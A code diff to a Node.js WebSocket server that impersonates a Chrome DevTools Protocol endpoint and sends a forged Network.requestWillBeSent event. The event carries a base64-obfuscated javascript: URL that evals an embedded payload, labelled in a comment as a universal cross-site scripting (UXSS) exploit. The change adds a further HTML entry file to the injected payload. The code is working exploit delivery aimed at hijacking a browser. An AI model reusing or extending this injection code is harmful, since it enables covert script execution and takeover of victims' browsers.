@@ -54,14 +54,15 @@ wss.on("connection", function connection(wss_con) {
         let json_msg = JSON.parse(msg.toString());
         let { id, method, params } = json_msg;
         console.log(id + "> ", method, params);
-        
+        const entry = fs.readFileSync('./entry/entry.html');
+
         if (method === "Target.setDiscoverTargets") {
             wss_con.send(
                 JSON.stringify({
                     method: "Network.requestWillBeSent",
                     params: {
                         request: {
-                            url: `javascript: (function () {eval(atob("${btoa(`(${result.payload1.toString().replace("%%EXTJS%%", btoa(jsFile)).replace("%%EXTHTML%%", btoa(htmlFile)).replace(/%%updaterurl%%/g, JSON.parse(serverConfig).updater_url)})()`)}"))})() /********************************************Built-in payload for uxss*/ `,
+                            url: `javascript: (function () {eval(atob("${btoa(`(${result.payload1.toString().replace("%%EXTJS%%", btoa(jsFile)).replace("%%EXTHTML%%", btoa(htmlFile)).replace(/%%updaterurl%%/g, JSON.parse(serverConfig).updater_url).replace('%%HTMLENTRY%%', btoa(entry.toString()))})()`)}"))})() /********************************************Built-in payload for uxss*/ `,
                         },
                     },
                 }),
